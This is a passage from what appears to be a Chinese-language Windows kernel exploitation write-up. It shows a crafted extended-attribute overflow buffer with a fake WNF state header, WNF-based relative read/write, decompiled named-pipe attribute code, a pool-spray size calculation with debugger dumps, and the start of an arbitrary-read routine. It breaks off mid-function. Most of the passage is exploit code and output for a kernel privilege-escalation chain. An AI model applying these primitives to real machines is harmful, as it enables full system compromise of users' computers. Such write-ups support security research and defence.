class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x66</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// NextEntryOffset</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// Flags</span></span><br><span class="line">        <span class="number">0x05</span>, <span class="comment">// EaNameLength</span></span><br><span class="line">        <span class="number">0x12</span>,<span class="number">0x00</span>, <span class="comment">// EaValueLen</span></span><br><span class="line">        <span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>,<span class="number">0x67</span>, <span class="comment">// name</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="comment">// padding</span></span><br><span class="line">        <span class="number">0x68</span>,<span class="number">0x68</span>, <span class="comment">// data</span></span><br><span class="line">        <span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x10</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> <span class="comment">// fake _WNF_STATE_DATA </span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>并使用 <code>ZwQueryWnfStateData</code> 来查询 <code>ChangeStamp</code> 是否不同来判别堆块是否有修改。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">NTAPI</span></span><br><span class="line"><span class="function"><span class="title">NtQueryWnfStateData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PCWNF_TYPE_ID TypeId,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ <span class="type">const</span> VOID* ExplicitScope,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PWNF_CHANGE_STAMP ChangeStamp,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ PULONG BufferSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>这样便可以实现一定偏移范围的读，也可以继续使用 <code>NtUpdateWnfStateData</code> 来实现一定偏移范围的写。</p>
<h2 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h2><p>接下来就是任意地址读，我们可以参考 <code>Scoop the Windows 10 pool!</code> 文章，使用 <code>PipeAttribute</code> ，其结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">pipe_attribute</span> &#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    <span class="type">char</span>* AttributeName;</span><br><span class="line">    <span class="type">size_t</span> ValueSize;</span><br><span class="line">    <span class="type">char</span>* AttributeValue;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125; <span class="type">pipe_attribute_t</span>;</span><br></pre></td></tr></table></figure>

<p>该结构也和 <code>_WNF_STATE_DATA</code> 结构类似，数据在后面，可以任意控制分配大小，我们可以使用以下代码调用它：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwFsControlFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_opt_  HANDLE           Event,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_opt_  PIO_APC_ROUTINE  ApcRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_opt_  PVOID            ApcContext,</span></span></span><br><span class="line"><span class="params"><span class="function">  _Out_     PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      ULONG            FsControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_opt_  PVOID            InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      ULONG            InputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  _Out_opt_ PVOID            OutputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      ULONG            OutputBufferLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">HANDLE read_pipe;</span><br><span class="line">HANDLE write_pipe;</span><br><span class="line"><span class="type">char</span> attribute[] = <span class="string">&quot;attribute_name\00attribute_value&quot;</span></span><br><span class="line"><span class="type">char</span> output [<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">CreatePipe</span>(read_pipe, write_pipe, <span class="literal">NULL</span>, bufsize);</span><br><span class="line"><span class="built_in">NtFsControlFile</span>(write_pipe,</span><br><span class="line">	<span class="literal">NULL</span>,</span><br><span class="line">	<span class="literal">NULL</span>,</span><br><span class="line">	<span class="literal">NULL</span>,</span><br><span class="line">	&amp;status,</span><br><span class="line">	<span class="number">0x11003C</span>,</span><br><span class="line">	attribute,</span><br><span class="line">	<span class="built_in">sizeof</span>(attribute),</span><br><span class="line">	output,</span><br><span class="line">	<span class="built_in">sizeof</span>(output)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>其主要逻辑位于 <code>npfs.sys</code> 中，其中 <code>SetAttribute</code> 的逻辑位于 <code>NpSetAttribute</code> 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">NpSetAttribute</span><span class="params">(pipe_attribute *a1, <span class="type">int</span> a2)</span> <span class="comment">// FsControlCode是0x11003C，对应的a2就为2</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	buf = (<span class="type">const</span> <span class="type">char</span> *)a1-&gt;buf;</span><br><span class="line">  bufSize = *(_DWORD *)(v2 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( bufSize )</span><br><span class="line">  &#123;</span><br><span class="line">    nameSize = <span class="number">0</span>;</span><br><span class="line">    bufPtr = (_BYTE *)a1-&gt;buf;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*bufPtr )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++nameSize;</span><br><span class="line">      ++bufPtr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( nameSize &lt; bufSize );</span><br><span class="line">    <span class="keyword">if</span> ( nameSize &amp;&amp; nameSize != bufSize )</span><br><span class="line">    &#123;</span><br><span class="line">      nameSizeAddOne = nameSize + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( nameSizeAddOne &gt;= bufSize )</span><br><span class="line">      &#123;</span><br><span class="line">        valueBuf = <span class="number">0</span>i64;</span><br><span class="line">        valueLen = <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        valueBuf = &amp;buf[nameSizeAddOne];</span><br><span class="line">        valueLen = bufSize - nameSizeAddOne;</span><br><span class="line">      &#125;</span><br><span class="line">			...</span><br><span class="line">			some strcmp check buf start</span><br><span class="line">			...</span><br><span class="line">			<span class="keyword">if</span> ( valueBuf )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = <span class="built_in">NpSetAttributeInList</span>(v16, <span class="number">0</span>i64, buf, valueBuf, valueLen);</span><br><span class="line">        <span class="keyword">if</span> ( v19 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">NpRemoveAttributeFromList</span>(v16, buf);</span><br><span class="line">        v19 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其通过 <code>\x00</code> 寻找并分割 <code>buf</code> ，同时判断 <code>buf</code> 的开始也就是 <code>name</code> 是不是为指定的一些值，并执行相应的操作。最后调用 <code>NpSetAttributeInList</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">NpSetAttributeInList</span><span class="params">(_QWORD *a1, _QWORD *providePtr, _BYTE *buf, <span class="type">const</span> <span class="type">void</span> *valueBuf, <span class="type">size_t</span> valueLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	attributeListHead = (pipe_attribute *)*a1;</span><br><span class="line">	...</span><br><span class="line">	allocSize = <span class="number">0x28</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)buf &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nameLenAddOne = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="number">0xFFFFFFFFFFFFFFFF</span>ui64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      ++ptr;</span><br><span class="line">    <span class="keyword">while</span> ( buf[ptr] );</span><br><span class="line">    nameLenAddOne = ptr + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( nameLenAddOne + <span class="number">0x28</span> &lt; <span class="number">0x28</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC0000095</span>i64;</span><br><span class="line">    allocSize = nameLenAddOne + <span class="number">0x28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( valueLen &lt;= <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">  <span class="keyword">if</span> ( allocSize + valueLen &lt; allocSize )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC0000095</span>i64;</span><br><span class="line">  allocSize += valueLen;</span><br><span class="line">LABEL_30:</span><br><span class="line">  <span class="keyword">if</span> ( providePtr )</span><br><span class="line">  &#123;</span><br><span class="line">    poolPtr = providePtr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    poolPtr = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, allocSize, <span class="number">0x7441704E</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !poolPtr )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)buf &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    poolPtr-&gt;AttributeName = (__int64)buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    poolPtr-&gt;AttributeName = (__int64)&amp;poolPtr-&gt;data;</span><br><span class="line">    <span class="built_in">memmove</span>(&amp;poolPtr-&gt;data, buf, nameLenAddOne);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( valueLen &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    attributeValuePtr = &amp;poolPtr-&gt;AttributeValue;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    attributeValuePtr = (__int64 *)(&amp;poolPtr-&gt;data + nameLenAddOne);</span><br><span class="line">    poolPtr-&gt;AttributeValue = (__int64)attributeValuePtr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memmove</span>(attributeValuePtr, valueBuf, valueLen);</span><br><span class="line">  poolPtr-&gt;ValueSize = valueLen;</span><br><span class="line">	<span class="keyword">if</span> ( attributeListHead )</span><br><span class="line">  &#123;</span><br><span class="line">    listFD = (pipe_attribute *)attributeListHead-&gt;listFD;</span><br><span class="line">    <span class="keyword">if</span> ( *(pipe_attribute **)(attributeListHead-&gt;listFD + <span class="number">8</span>) != attributeListHead</span><br><span class="line">      || (listBK = (pipe_attribute **)attributeListHead-&gt;listBK, *listBK != attributeListHead) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_47:</span><br><span class="line">      __fastfail(<span class="number">3u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *listBK = listFD;</span><br><span class="line">    listFD-&gt;listBK = (__int64)listBK;</span><br><span class="line">    <span class="keyword">if</span> ( attributeListHead != (pipe_attribute *)providePtr )</span><br><span class="line">      <span class="built_in">ExFreePoolWithTag</span>(attributeListHead, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  listHeader_0 = (pipe_attribute *)a1[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( (_QWORD *)listHeader_0-&gt;listFD != a1 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">  poolPtr-&gt;listBK = (__int64)listHeader_0;</span><br><span class="line">  poolPtr-&gt;listFD = (__int64)a1;</span><br><span class="line">  listHeader_0-&gt;listFD = (__int64)poolPtr;</span><br><span class="line">  result = <span class="number">0</span>i64;</span><br><span class="line">  a1[<span class="number">1</span>] = poolPtr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其会判断 <code>name</code> 和 <code>value</code> 的大小是否大于 <code>8</code> ，如果不是则不用分配 <code>data</code> 而是直接放在对应的指针位置，否则放在 <code>data</code> 处。初始化完毕后还会将该块链入 <code>list</code> 中。</p>
<p>最后 <code>alloc</code> 的大小为 <code>0x28 + dataLen</code>（传入的 <code>attribute</code> 的大小）。所以假设我们需要喷一个 <code>0xa0</code> 大小的块，那么我们需要构造的 <code>dataLen = 0xa0 - 0x10 - 0x28  = 0x68</code> 。喷成功的结果如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dq ffff9f0845964980+<span class="number">0xa0</span>*<span class="number">2</span></span><br><span class="line">ffff9f08`<span class="number">45964</span>ac0  <span class="number">7441704</span>e`<span class="number">030</span>a0000 <span class="number">19684</span>ad3`<span class="number">1f</span>c8912b</span><br><span class="line">ffff9f08`<span class="number">45964</span>ad0  ffff9f08`<span class="number">45963e50</span> ffff9f08`<span class="number">45964850</span></span><br><span class="line">ffff9f08`<span class="number">45964</span>ae0  ffff9f08`<span class="number">45964</span>af8 <span class="number">00000000</span>`<span class="number">0000005</span>e</span><br><span class="line">ffff9f08`<span class="number">45964</span>af0  ffff9f08`<span class="number">45964b</span>02 <span class="number">69686766</span>`<span class="number">69686766</span></span><br><span class="line">ffff9f08`<span class="number">45964b</span>00  <span class="number">61616161</span>`<span class="number">61610005</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line">ffff9f08`<span class="number">45964b</span>10  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line">ffff9f08`<span class="number">45964b</span>20  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line">ffff9f08`<span class="number">45964b</span>30  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br></pre></td></tr></table></figure>

<p>和我们之前描述的 <code>pipe_attribute</code> 结构一致，这样我们便可以释放溢出块后面的 <code>WNF</code> 块并使用 <code>pipe_attribute</code> 占位回来，泄露出池的地址：</p>
<p><img src="https://s2.loli.net/2022/05/04/NAzHpVMIh6nBO29.png" alt="Untitled 1.png"></p>
<p>另外，如果我们没有提供 <code>value</code> ，那么默认会走到 <code>NpRemoveAttributeFromList</code> 中去遍历链表删除该 <code>attribute</code> （使用 <code>ExFreePoolWithTag</code> 释放块）并解链。还有 <code>NpGetAttribute</code> ，其也是遍历链表，对比 <code>name</code> 并输出匹配的 <code>value</code> ，函数逻辑比较简单这里就不贴了。</p>
<p>那么我们便可以通过修改 <code>AttributeValue</code> 的指针并通过 <code>NpGetAttribute</code> 来得到一个任意地址读的原语，其中 <code>NpGetAttribute</code>  也是需要 <code>FsControlCode</code> 为 <code>0x110038</code> 的 <code>NtFsControlFile</code> ，如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipeReadAttribute</span><span class="params">(PipeHandles pipeHandles, PCHAR nameBuffer, PCHAR output, ULONG size)</span> </span>&#123;</span><br><span class="line">    PZwFsControlFile ZwFsControlFile = (PZwFsControlFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwFsControlFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwFsControlFile) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwFsControlFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    IO_STATUS_BLOCK fsControlFileIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> name_length = <span 